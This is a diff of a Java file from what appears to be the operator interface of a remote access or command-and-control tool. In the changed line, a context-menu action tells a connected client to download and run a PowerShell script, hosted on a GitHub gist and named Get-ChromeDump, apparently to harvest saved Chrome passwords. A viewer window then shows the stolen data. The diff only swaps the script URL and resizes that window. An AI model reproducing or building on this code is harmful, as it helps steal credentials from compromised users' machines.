@@ -197,13 +197,13 @@ class IPContextMenu implements Repository {
                 }
                 try {
 
-                    clientObject.clientCommunicate("PSHURL https://gist.github.com/cbrnrd/ad2b524f3af3d94d1bce6d9961e07a89/raw/adbb63c9d70b103bd9b77f78893db7f9a72199a2/Get-ChromeDump-Full-CSV.ps1" );
+                    clientObject.clientCommunicate("PSHURL https://gist.github.com/cbrnrd/d7e9870549116ba2ccf1dab96c0b91d0/raw/d33c55e3c20c4505fa1666c9f64d581ee700fa29/Get-ChromeDump-CSV.ps1" );
 
                     Stage stage = new Stage();
                     stage.initStyle(StageStyle.UNDECORATED);
                     stage.setMinHeight(300);
                     stage.setMinWidth(300);
-                    stage.setScene(new Scene(new ChromePassView().getChromePassView(stage), 800, 800));
+                    stage.setScene(new Scene(new ChromePassView().getChromePassView(stage), 800, 900));
                     stage.show();
                 } catch (IOException ioe){
                     ioe.printStackTrace();
